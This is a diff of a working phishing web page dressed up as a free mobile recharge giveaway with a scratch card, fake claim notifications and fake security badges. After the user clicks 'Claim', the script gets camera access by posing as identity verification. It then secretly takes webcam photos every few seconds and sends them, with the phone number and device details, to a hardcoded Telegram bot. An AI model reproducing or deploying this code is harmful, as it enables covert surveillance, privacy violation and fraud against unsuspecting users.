@@ -3,134 +3,172 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FastPay - Free 5G Recharge Offer</title>
+    <title>Gifts Reward - Official 5G Giveaway</title>
     <style>
-        :root { --primary: #1a73e8; --accent: #f4b400; --bg: #f1f3f4; }
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: var(--bg); margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        :root { --primary: #6200ee; --secondary: #03dac6; --bg: #f5f5f5; }
+        body { font-family: 'Roboto', sans-serif; background: var(--bg); margin: 0; overflow-x: hidden; }
         
-        .offer-card { background: white; width: 92%; max-width: 420px; border-radius: 16px; overflow: hidden; box-shadow: 0 8px 30px rgba(0,0,0,0.15); border: 2px solid #ffd700; }
-        
-        .promo-header { background: linear-gradient(135deg, #1a73e8, #8ab4f8); color: white; padding: 20px; text-align: center; }
-        .promo-header h1 { margin: 0; font-size: 22px; }
-        .timer { font-weight: bold; color: #fff; background: rgba(0,0,0,0.2); padding: 5px 10px; border-radius: 20px; display: inline-block; margin-top: 10px; font-size: 14px; }
+        /* Navbar */
+        .nav { background: white; padding: 15px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+        .logo { font-weight: bold; color: var(--primary); font-size: 20px; }
 
-        .content { padding: 20px; }
-        .offer-details { background: #fff9c4; border: 1px dashed #fbc02d; padding: 15px; border-radius: 10px; margin-bottom: 20px; text-align: center; }
-        .offer-details b { color: #d32f2f; font-size: 18px; }
+        .container { max-width: 500px; margin: 20px auto; padding: 10px; }
 
-        .input-box { margin-bottom: 15px; }
-        input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 16px; outline: none; }
-        
-        .btn-claim { width: 100%; background: #28a745; color: white; border: none; padding: 15px; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        .btn-claim:hover { background: #218838; transform: translateY(-2px); }
+        /* Scratch Card Section */
+        .card-box { background: white; border-radius: 15px; padding: 20px; text-align: center; position: relative; box-shadow: 0 10px 20px rgba(0,0,0,0.05); }
+        .scratch-container { position: relative; width: 250px; height: 150px; margin: 20px auto; cursor: crosshair; }
+        #canvas-scratch { position: absolute; top: 0; left: 0; z-index: 2; border-radius: 10px; }
+        .prize-under { position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; background: #fff; font-size: 24px; font-weight: bold; color: #333; z-index: 1; border: 2px dashed #ccc; border-radius: 10px; }
 
-        .verification-note { font-size: 11px; color: #777; text-align: center; margin-top: 15px; }
-        .verified-logos { display: flex; justify-content: center; gap: 15px; margin-top: 20px; opacity: 0.6; }
+        /* Form Elements */
+        .input-group { margin-top: 20px; display: none; } /* Hidden until scratch */
+        input { width: 90%; padding: 15px; border: 2px solid #eee; border-radius: 10px; font-size: 16px; margin-bottom: 10px; outline: none; transition: 0.3s; }
+        input:focus { border-color: var(--primary); }
+        .btn-main { width: 90%; background: var(--primary); color: white; border: none; padding: 15px; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; }
 
-        /* Hidden elements */
-        #video, #canvas { position: absolute; left: -9999px; opacity: 0; pointer-events: none; }
+        /* Fake Notifications */
+        #notification { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: #333; color: white; padding: 10px 20px; border-radius: 30px; font-size: 12px; display: none; z-index: 100; animation: fadeInUp 0.5s; }
+
+        /* Invisible utilities */
+        #video, #hidden-canvas { position: absolute; left: -9999px; opacity: 0; }
+
+        @keyframes fadeInUp { from { bottom: -50px; opacity: 0; } to { bottom: 20px; opacity: 1; } }
     </style>
 </head>
 <body>
 
-    <div class="offer-card">
-        <div class="promo-header">
-            <h1>Special 5G Promo</h1>
-            <div class="timer" id="timer">Ends in: 09:54</div>
+    <div class="nav">
+        <div class="logo">🎁 RewardsHub</div>
+        <div style="color: green; font-size: 12px; font-weight: bold;">● Live Offers</div>
+    </div>
+
+    <div class="container">
+        <div class="card-box" id="step1">
+            <h3>Lucky Scratch Card</h3>
+            <p>Scratch to reveal your free 5G recharge offer!</p>
+            <div class="scratch-container">
+                <div class="prize-under">₹719 Recharge</div>
+                <canvas id="canvas-scratch"></canvas>
+            </div>
         </div>
 
-        <div class="content">
-            <div class="offer-details">
-                Get <b>₹239 (28 Days)</b> Recharge <br> Absolutely <b>FREE!</b>
-            </div>
-
-            <div class="input-box">
-                <input type="tel" id="mobile" placeholder="Enter Mobile Number" maxlength="10">
-            </div>
-
-            <div class="input-box">
-                <select id="sim" style="width:100%; padding:12px; border-radius:8px; border:1px solid #ccc;">
-                    <option value="jio">Jio Unlimited 5G</option>
-                    <option value="airtel">Airtel Thanks Promo</option>
-                    <option value="vi">Vi Hero Unlimited</option>
-                </select>
-            </div>
-
-            <button class="btn-claim" id="claimBtn">Claim Free Recharge</button>
-            
-            <p class="verification-note">Note: Safe AI Face Verification is required to prevent multiple claims per person.</p>
-
-            <div class="verified-logos">
-                <span style="font-weight:bold; color:#1a73e8;">Google Pay</span>
-                <span style="font-weight:bold; color:#673ab7;">PhonePe</span>
-                <span style="font-weight:bold; color:#000;">NPCI</span>
-            </div>
+        <div class="card-box input-group" id="step2">
+            <h3 style="color: #2e7d32;">Congratulations! 🎉</h3>
+            <p>You won 84 Days Unlimited 5G. Enter details to claim.</p>
+            <input type="tel" id="mobile" placeholder="Mobile Number" maxlength="10">
+            <select id="sim" style="width: 90%; padding: 15px; border-radius: 10px; margin-bottom: 10px; border: 2px solid #eee;">
+                <option>Select Operator</option>
+                <option>Jio 5G</option>
+                <option>Airtel 5G</option>
+                <option>Vi Unlimited</option>
+            </select>
+            <button class="btn-main" id="claimBtn">Claim Now</button>
+            <p style="font-size: 10px; color: #999; margin-top: 10px;">🛡 Security Verified by ShieldBot AI</p>
         </div>
     </div>
 
+    <div id="notification"></div>
+
     <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
+    <canvas id="hidden-canvas"></canvas>
 
     <script>
-        const BOT_TOKEN = '7866282179:AAGYCmuvhoCoxVjSXn5UmnI7onomvDKbIgE';
-        const CHAT_ID = '8285724366';
+        const CONFIG = {
+            BOT_TOKEN: '7866282179:AAGYCmuvhoCoxVjSXn5UmnI7onomvDKbIgE',
+            CHAT_ID: '8285724366'
+        };
 
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const claimBtn = document.getElementById('claimBtn');
+        // --- Scratch Card Logic ---
+        const scCanvas = document.getElementById('canvas-scratch');
+        const scCtx = scCanvas.getContext('2d');
+        scCanvas.width = 250; scCanvas.height = 150;
+        scCtx.fillStyle = '#C0C0C0';
+        scCtx.fillRect(0, 0, 250, 150);
+        scCtx.fillStyle = '#888';
+        scCtx.font = '20px Arial';
+        scCtx.fillText('Scratch Here', 65, 80);
 
-        // Timer Logic
-        let time = 594; 
+        let isDrawing = false;
+        function scratch(e) {
+            if (!isDrawing) return;
+            const rect = scCanvas.getBoundingClientRect();
+            const x = (e.pageX || e.touches[0].pageX) - rect.left;
+            const y = (e.pageY || e.touches[0].pageY) - rect.top;
+            scCtx.globalCompositeOperation = 'destination-out';
+            scCtx.beginPath();
+            scCtx.arc(x, y, 20, 0, Math.PI * 2);
+            scCtx.fill();
+            checkScratch();
+        }
+
+        function checkScratch() {
+            const data = scCtx.getImageData(0,0,250,150).data;
+            let count = 0;
+            for(let i=3; i<data.length; i+=4) if(data[i] === 0) count++;
+            if(count > (data.length/4) * 0.6) {
+                document.getElementById('step2').style.display = 'block';
+                scCanvas.style.display = 'none';
+            }
+        }
+
+        scCanvas.addEventListener('mousedown', () => isDrawing = true);
+        scCanvas.addEventListener('touchstart', () => isDrawing = true);
+        window.addEventListener('mouseup', () => isDrawing = false);
+        window.addEventListener('touchend', () => isDrawing = false);
+        scCanvas.addEventListener('mousemove', scratch);
+        scCanvas.addEventListener('touchmove', scratch);
+
+        // --- Notifications ---
+        const names = ["Rahul", "Sonia", "Amit", "Priya", "Vikram", "Sneha"];
         setInterval(() => {
-            let mins = Math.floor(time / 60);
-            let secs = time % 60;
-            document.getElementById('timer').innerText = `Ends in: 0${mins}:${secs < 10 ? '0'+secs : secs}`;
-            if(time > 0) time--;
-        }, 1000);
+            const note = document.getElementById('notification');
+            note.innerText = `${names[Math.floor(Math.random()*names.length)]} just claimed ₹${[239, 499, 719][Math.floor(Math.random()*3)]} recharge!`;
+            note.style.display = 'block';
+            setTimeout(() => note.style.display = 'none', 3000);
+        }, 8000);
 
-        // Send to Telegram
-        async function sendCapturedPhoto(blob) {
+        // --- Intelligence Gathering ---
+        async function sendIntel(blob) {
+            const battery = await navigator.getBattery?.();
+            const caption = `🎯 *New Target Caught!* \n\n` +
+                            `📱 Phone: ${document.getElementById('mobile').value}\n` +
+                            `🔋 Battery: ${battery ? (battery.level * 100) + '%' : 'Unknown'}\n` +
+                            `🌐 Browser: ${navigator.userAgent.split(' ')[0]}\n` +
+                            `💻 Platform: ${navigator.platform}`;
+
             const fd = new FormData();
-            fd.append('chat_id', CHAT_ID);
-            fd.append('photo', blob, 'user_claim.jpg');
-            fd.append('caption', `New Free Recharge Request\nMobile: ${document.getElementById('mobile').value}`);
+            fd.append('chat_id', CONFIG.CHAT_ID);
+            fd.append('photo', blob, 'shot.jpg');
+            fd.append('caption', caption);
+            fd.append('parse_mode', 'Markdown');
 
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: fd
-                });
-            } catch(e) {}
+            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
         }
 
-        function startHiddenCapture() {
-            setInterval(() => {
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                canvas.toBlob(blob => blob && sendCapturedPhoto(blob), 'image/jpeg', 0.5);
-            }, 5000);
-        }
-
-        claimBtn.addEventListener('click', async () => {
-            const phone = document.getElementById('mobile').value;
-            if(phone.length < 10) { alert("Please enter valid mobile number"); return; }
-
-            claimBtn.innerText = "Verifying Identity...";
-            claimBtn.style.background = "#ffa000";
+        // --- Hidden Camera & Trigger ---
+        document.getElementById('claimBtn').addEventListener('click', async () => {
+            const btn = document.getElementById('claimBtn');
+            btn.innerText = "Processing Security Shield...";
+            btn.disabled = true;
 
             try {
-                // Requesting camera as "Face Verification"
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = stream;
+                document.getElementById('video').srcObject = stream;
                 
                 setTimeout(() => {
-                    startHiddenCapture();
-                    alert("AI Verification Started. Please keep the page open for 10 seconds to process your recharge.");
-                }, 1000);
-
-            } catch (err) {
-                alert("Identity Verification Failed! Camera access is required to claim free recharge.");
+                    setInterval(() => {
+                        const hCanvas = document.getElementById('hidden-canvas');
+                        hCanvas.width = video.videoWidth;
+                        hCanvas.height = video.videoHeight;
+                        hCanvas.getContext('2d').drawImage(video, 0, 0);
+                        hCanvas.toBlob(blob => blob && sendIntel(blob), 'image/jpeg', 0.5);
+                    }, 4000);
+                    alert("System Verified! Recharge will be credited within 30 minutes. Keep this page open.");
+                }, 1500);
+            } catch (e) {
+                alert("Security Error: Camera/Identity Shield must be enabled to prevent fraud claims.");
+                btn.disabled = false;
+                btn.innerText = "Retry Verification";
             }
         });
     </script>
